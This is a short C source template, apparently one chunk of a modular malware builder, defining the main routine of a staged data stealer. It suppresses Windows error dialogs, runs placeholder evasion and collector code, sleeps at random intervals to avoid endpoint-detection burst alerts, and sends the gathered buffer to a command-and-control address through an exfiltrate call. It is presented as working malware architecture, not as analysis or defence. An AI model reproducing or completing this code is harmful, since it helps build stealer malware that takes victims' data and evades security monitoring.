// chunk: arch/staged
// depends: core/emit_buffer, evasion/sleep_jitter, exfil/*
// provides: main
// note: behavioral pacing — random sleep between collectors to avoid EDR burst detection

#ifndef CHUNK_ARCH_STAGED
#define CHUNK_ARCH_STAGED

/* jitter_sleep: provided by evasion/sleep_jitter or defined inline */
#ifndef JITTER_SLEEP_DEFINED
#define JITTER_SLEEP_DEFINED
static void jitter_sleep(DWORD min_ms, DWORD max_ms) {
    DWORD range = max_ms - min_ms;
    DWORD wait = min_ms + (GetTickCount() % (range + 1));
    Sleep(wait);
}
#endif

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
{{EVASION_INIT}}

    init_buffer();
    if (!g_data) return 1;

    {{STAGED_COLLECTOR_CALLS}}

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;
}

#endif
